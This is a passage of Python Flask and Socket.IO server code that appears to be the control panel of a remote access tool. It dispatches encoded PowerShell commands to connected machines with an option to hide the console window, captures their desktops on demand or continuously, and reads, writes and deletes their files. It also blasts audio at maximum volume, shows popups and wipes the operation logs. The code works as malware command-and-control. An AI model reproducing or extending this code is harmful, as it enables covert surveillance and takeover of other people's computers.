                "visible": row["visible"] if row["visible"] is not None else 1,
                "capture": bool(row["capture"]) if row["capture"] is not None else False,
                "version": row["version"] if row["version"] is not None else "",
                "ip": row["ip"] if "ip" in row.keys() and row["ip"] is not None else "",
                "online": row["username"] in online_usernames,
            }
            for row in rows
        ]
    )


# ── REST API Routes: Screenshot Frames Management ────────────────────────────

@app.get("/api/frames/<username>")
@require_password
def get_frames(username: str) -> Response:
    """
    Retrieve sorted list of stored screenshot filenames for a specific client.

    Parameters:
        username (str): Target client username.

    Returns:
        Response: JSON array of image filenames sorted numerically.
    """
    if not is_safe_name(username):
        return jsonify({"detail": "Invalid username", "status": "error"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if not os.path.exists(user_dir):
        return jsonify([])

    files = sorted(
        [
            f
            for f in os.listdir(user_dir)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ],
        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
    )

    return jsonify(files)


@app.post("/api/frames/delete")
@require_password
def delete_frames() -> Response:
    """
    Wipe all stored screenshot frames on disk for a specific client.

    Returns:
        Response: JSON status response.
    """
    data = request.get_json(silent=True) or {}
    username = data.get("username")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if os.path.exists(user_dir):
        try:
            shutil.rmtree(user_dir)
            os.makedirs(user_dir, exist_ok=True)
            log_operation(username, "SCREENSHOT", "Wiped all stored screenshot frames")
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    return jsonify({"status": "success"})


@app.post("/api/capture")
@require_password
def set_capture() -> Response:
    """
    Toggle the continuous real-time screenshot stream flag on/off for a client.

    Returns:
        Response: JSON status response.
    """
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    capture = data.get("capture")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if capture is None:
        return jsonify({"status": "error", "message": "Missing capture flag"}), 400

    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO clients (username, capture)
            VALUES (?, ?)
            ON CONFLICT(username) DO UPDATE SET
                capture = excluded.capture
            """,
            (username, 1 if capture else 0),
        )

    socketio.emit("set_capture", {"capture": bool(capture)}, room=username)
    log_operation(
        username,
        "SCREENSHOT",
        f"Continuous screenshot stream toggled {'ON' if capture else 'OFF'}",
    )
    return jsonify({"status": "success"})


@app.post("/api/screenshot/take")
@require_password
def take_screenshot() -> Response:
    """
    Dispatch an on-demand single desktop screenshot request to an online client,
    blocking synchronously until captured or timed out (10s).

    Returns:
        Response: JSON response containing generated image filename and URL.
    """
    data = request.get_json(silent=True) or {}
    username = data.get("username")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    with client_lock:
        is_online = username in active_clients.values()

    if not is_online:
        return jsonify({"status": "error", "message": "Client is currently offline"}), 404

    with get_db() as conn:
        row = conn.execute(
            "SELECT capture FROM clients WHERE username = ?", (username,)
        ).fetchone()
        if row and row["capture"]:
            return (
                jsonify(
                    {
                        "status": "error",
                        "message": "Cannot capture single screenshot while Screenshot Stream is active.",
                    }
                ),
                400,
            )

    req_id = str(uuid.uuid4())
    event = threading.Event()
    with screenshot_lock:
        pending_screenshot_requests[req_id] = {
            "event": event,
            "username": username,
            "result": None,
        }

    socketio.emit("take_screenshot", {"req_id": req_id}, room=username)

    finished = event.wait(timeout=10)
    with screenshot_lock:
        entry = pending_screenshot_requests.pop(req_id, None)

    if not finished or not entry or not entry.get("result"):
        return jsonify({"status": "error", "message": "Screenshot capture timed out"}), 504

    res = entry["result"]
    if res.get("error"):
        return jsonify({"status": "error", "message": res["error"]}), 500

    filename = res.get("filename")
    log_operation(username, "SCREENSHOT", f"Single screenshot captured ({filename})")

    return jsonify(
        {
            "status": "success",
            "filename": filename,
            "url": f"/frames/{username}/{filename}",
            "username": username,
        }
    )


@app.get("/frames/<username>/<filename>")
def get_frame(username: str, filename: str) -> Response:
    """
    Serve a specific screenshot frame image file with immutable public cache headers.

    Parameters:
        username (str): Client username identifier.
        filename (str): Image filename.

    Returns:
        Response: File data with HTTP cache headers.
    """
    if not is_safe_name(username) or not is_safe_name(filename):
        return jsonify({"detail": "Invalid path", "status": "error"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    response = send_from_directory(user_dir, filename)
    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    return response


# ── REST API Routes: Command & Media Execution ───────────────────────────────

@app.post("/api/visibility")
@require_password
def set_visibility() -> Response:
    """
    Update target client console window visibility flag (1 = visible, 0 = hidden).

    Returns:
        Response: JSON status response.
    """
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    visible = data.get("visible")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if visible is None:
        return jsonify({"status": "error", "message": "Missing visible flag"}), 400

    _upsert_client_visibility(username, visible)
    log_operation(
        username,
        "VISIBILITY",
        f"Console window visibility set to {'Visible' if visible else 'Hidden'}",
    )
    return jsonify({"status": "success"})


@app.post("/api/command")
@require_password
def set_command() -> Response:
    """
    Dispatch an encoded PowerShell / shell command to the connected client via WebSocket,
    categorize the payload for the audit trail, and persist the operation log.

    Returns:
        Response: JSON status response.
    """
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    cmd = data.get("cmd")
    visible = data.get("visible", 1)

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if cmd is None:
        return jsonify({"status": "error", "message": "Missing cmd string"}), 400

    _upsert_client_visibility(username, visible)

    # Push command payload immediately to client WebSocket room
    socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)

    # Decode and categorize command for the administrative audit log
    try:
        decoded = base64.b64decode(cmd).decode("utf-8", errors="replace").strip()
    except Exception:
        decoded = str(cmd).strip()

    op_type = "COMMAND"
    log_detail = decoded

    if "SAPI.SpVoice" in decoded or decoded.startswith("speak:"):
        op_type = "SPEAK"
        if decoded.startswith("speak:"):
            log_detail = decoded[6:].strip()
    elif "WScript.Shell).Popup" in decoded or decoded.startswith("msg:"):
        op_type = "MESSAGE"
        if decoded.startswith("msg:"):
            log_detail = decoded[4:].strip()
    elif "$pb.Image" in decoded or "Drawing.Image]::FromStream" in decoded:
        op_type = "IMAGER"
        cap_match = re.search(r"\$caption\s*=\s*'([^']*)'", decoded)
        if cap_match and cap_match.group(1):
            log_detail = f"Image popup sent: {cap_match.group(1)}"
        else:
            log_detail = "Dispatched image popup to client"
    elif "WMPlayer.OCX" in decoded or "run_audio" in decoded or "play_audio" in decoded:
        op_type = "AUDIO"
        log_detail = "Dispatched audio blast to client at max volume"
    elif "installer.exe" in decoded:
        op_type = "UPDATE"
        log_detail = "Dispatched client update to latest release binary"
    elif decoded.lower().startswith("vibrate"):
        op_type = "DEVICE"
        log_detail = f"Device vibration triggered ({decoded})"
    elif decoded.lower().startswith("open:"):
        op_type = "DEVICE"
        log_detail = f"Opened URL: {decoded[5:].strip()}"

    log_operation(username, op_type, log_detail, "dispatched")

    return jsonify({"status": "success", "message": "Command sent over WebSocket"})


@app.post("/api/image")
@require_password
def send_image() -> Response:
    """
    Send an image dialog popup request with base64 image data to the target client.

    Returns:
        Response: JSON status response.
    """
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    image_b64 = data.get("image")
    caption = (data.get("caption") or "").strip()

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if not image_b64:
        return jsonify({"status": "error", "message": "Missing image data"}), 400

    socketio.emit("display_image", {"image": image_b64, "caption": caption}, room=username)

    detail = f"Image popup sent: {caption}" if caption else "Dispatched image popup to client"
    log_operation(username, "IMAGER", detail, "dispatched")

    return jsonify({"status": "success", "message": "Image sent over WebSocket"})


@app.post("/api/audio")
@require_password
def send_audio() -> Response:
    """
    Dispatch an audio clip playback request to play at maximum system volume on the client.

    Returns:
        Response: JSON status response.
    """
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    audio_b64 = data.get("audio")
    filename = (data.get("filename") or "audio.mp3").strip()
    title = (data.get("title") or "").strip()

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if not audio_b64:
        return jsonify({"status": "error", "message": "Missing audio data"}), 400

    socketio.emit(
        "play_audio",
        {"audio": audio_b64, "filename": filename, "title": title},
        room=username,
    )

    detail = f"Audio blast sent ({filename}): {title}" if title else f"Audio blast sent ({filename}) at max volume"
    log_operation(username, "AUDIO", detail, "dispatched")

    return jsonify({"status": "success", "message": "Audio sent over WebSocket"})


# ── REST API Routes: Remote File System (FTP) Browser ────────────────────────

def dispatch_fs_request(username: str, event_name: str, payload: dict, timeout: int = 10) -> Response:
    """
    Dispatch a file system operation over WebSocket to an online client, waiting synchronously for the response.

    Parameters:
        username (str): Target client username.
        event_name (str): WebSocket request event name (e.g., 'fs_list_req', 'fs_read_req').
        payload (dict): Payload containing parameters such as paths and file contents.
        timeout (int): Seconds to wait before returning a 504 Gateway Timeout.

    Returns:
        Response: Flask JSON response with operation result or error.
    """
    if not username or not is_safe_name(username):
        return jsonify({"error": "Missing or invalid username"}), 400

    with client_lock:
        is_online = username in active_clients.values()

    if not is_online:
        return jsonify({"error": "Client is currently offline"}), 404

    req_id = str(uuid.uuid4())
    event = threading.Event()
    with fs_lock:
        pending_fs_requests[req_id] = {"event": event, "result": None}

    req_payload = {"req_id": req_id, **payload}
    socketio.emit(event_name, req_payload, room=username)

    action_map = {
        "fs_list_req": "Listed directory contents",
        "fs_read_req": "Read file content",
        "fs_write_req": "Saved file content",
        "fs_delete_req": "Deleted file/directory",
        "fs_mkdir_req": "Created new directory",
        "fs_rename_req": "Renamed file/directory",
    }
    action_desc = action_map.get(event_name, event_name)
    target_path = payload.get("path") or payload.get("new_path") or "drives"
    log_operation(username, "FTP", f"{action_desc}: {target_path}")

    if event.wait(timeout=timeout):
        with fs_lock:
            res = pending_fs_requests.pop(req_id, {}).get("result")
        return jsonify(res or {"error": "No response payload"})
    else:
        with fs_lock:
            pending_fs_requests.pop(req_id, None)
        return jsonify({"error": f"Request {event_name} timed out"}), 504


@app.post("/api/fs/list")
@require_password
def fs_list() -> Response:
    """List filesystem contents or available drives for a target client."""
    data = request.get_json(silent=True) or {}
    return dispatch_fs_request(
        data.get("username"),
        "fs_list_req",
        {"path": data.get("path", "drives")},
        timeout=8,
    )


@app.post("/api/fs/read")
@require_password
def fs_read() -> Response:
    """Read file preview text or binary data from target client filesystem."""
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_read_req",
        {"path": data.get("path")},
        timeout=10,
    )


@app.post("/api/fs/write")
@require_password
def fs_write() -> Response:
    """Write/save file contents to target client filesystem."""
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_write_req",
        {
            "path": data.get("path"),
            "content": data.get("content", ""),
            "is_base64": bool(data.get("is_base64", False)),
        },
        timeout=15,
    )


@app.post("/api/fs/delete")
@require_password
def fs_delete() -> Response:
    """Delete a file or directory from target client filesystem."""
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_delete_req",
        {"path": data.get("path")},
        timeout=10,
    )


@app.post("/api/fs/mkdir")
@require_password
def fs_mkdir() -> Response:
    """Create a new directory on target client filesystem."""
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_mkdir_req",
        {"path": data.get("path")},
        timeout=10,
    )


@app.post("/api/fs/rename")
@require_password
def fs_rename() -> Response:
    """Rename a file or folder on target client filesystem."""
    data = request.get_json(silent=True) or {}
    if not data.get("old_path") or not data.get("new_path"):
        return jsonify({"error": "Missing old_path or new_path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_rename_req",
        {
            "old_path": data.get("old_path"),
            "new_path": data.get("new_path"),
        },
        timeout=10,
    )


# ── REST API Routes: Operations Audit Logging ────────────────────────────────

@app.get("/api/logs/<username>")
@require_password
def get_user_logs(username: str) -> Response:
    """
    Fetch chronological audit logs of all actions performed on/by a specific client.

    Parameters:
        username (str): Target client username.

    Returns:
        Response: JSON array of log records.
    """
    if not is_safe_name(username):
        return jsonify({"detail": "Invalid username", "status": "error"}), 400

    limit = request.args.get("limit", 200, type=int)
    limit = min(max(1, limit), 500)

    with get_db() as conn:
        rows = conn.execute(
            """
            SELECT id, username, op_type, details, status, created_at
            FROM operations_log
            WHERE username = ?
            ORDER BY id DESC
            LIMIT ?
            """,
            (username, limit),
        ).fetchall()

    return jsonify(
        [
            {
                "id": r["id"],
                "username": r["username"],
                "op_type": r["op_type"],
                "details": r["details"],
                "status": r["status"],
                "created_at": r["created_at"],
            }
            for r in rows
        ]
    )


@app.post("/api/logs/<username>/clear")
@require_password
def clear_user_logs(username: str) -> Response:
    """
    Clear all recorded operations audit logs for a specific client.

    Parameters:
        username (str): Target client username.

    Returns:
        Response: JSON status response.
    """
    if not is_safe_name(username):
        return jsonify({"detail": "Invalid username", "status": "error"}), 400

    with get_db() as conn:
        conn.execute("DELETE FROM operations_log WHERE username = ?", (username,))

    log_operation(username, "SYSTEM", "Operation logs cleared by administrator")
    return jsonify({"status": "success"})


# ── Application Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    cert_file = os.getenv("SSL_CERT", "cert.pem")
    key_file = os.getenv("SSL_KEY", "key.pem")
    ssl_kwargs = {}
    if os.path.exists(cert_file) and os.path.exists(key_file):
        print(f"[*] SSL certificates detected ({cert_file}, {key_file}) - Launching server over HTTPS...")
        if ASYNC_MODE == "eventlet":
            ssl_kwargs = {"certfile": cert_file, "keyfile": key_file}
        else:
            ssl_kwargs = {"ssl_context": (cert_file, key_file)}

    socketio.run(app, host="0.0.0.0", port=5002, debug=False, allow_unsafe_werkzeug=True, **ssl_kwargs)
